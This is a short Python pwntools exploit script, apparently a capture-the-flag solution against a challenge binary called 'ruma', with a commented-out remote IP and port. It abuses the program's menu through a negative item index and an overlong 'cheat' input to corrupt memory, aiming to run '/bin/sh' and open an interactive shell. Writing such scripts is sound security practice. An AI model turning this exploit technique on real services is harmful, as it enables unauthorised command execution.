from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./ruma')
# p = remote("13.124.134.94", 8888)

script = "b *0x8048b4c\n"
script += "b *0x8049061\n"
script += "b *0x8049042\n"

gdb.attach(p, gdbscript=script)

cmd_addr = 0x804b06c

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def spawn(expr, color, name):
  r("item\n")
  s("1")

  r("expr: ")
  s(str(expr))

  r("color: ")
  s(str(color))

  r("name: ")
  s(name, False)

def hunt():
  r("item\n")
  s("2")

def buy_item(idx):
  r("item\n")
  s("4")

  r("(300 zeny)\n")
  s(str(idx))

def cheat(cmd):
  r("item\n")
  s("1337")

  r("command? :")
  s(cmd, False)

def change_player(name):
  r("item\n")
  s("3")

  r("name?:")
  s(name, False)

r("name?:")
s("/bin/sh")


spawn(cmd_addr, cmd_addr, "maejinvv")
hunt()

buy_item(-1)

change_player("AAAAAAAA")

"""
cheat("black sheep wall")
r("AAAAAAAA")
heap_leak = u64(r("\n")[:4].ljust(8, "\x00"))

print "[*] heap_leak: 0x%x" % heap_leak
"""

cheat("a" * 0x14)

buy_item(3)
buy_item(-1)

# cheat("power overwhelming")

p.interactive()
p.close()
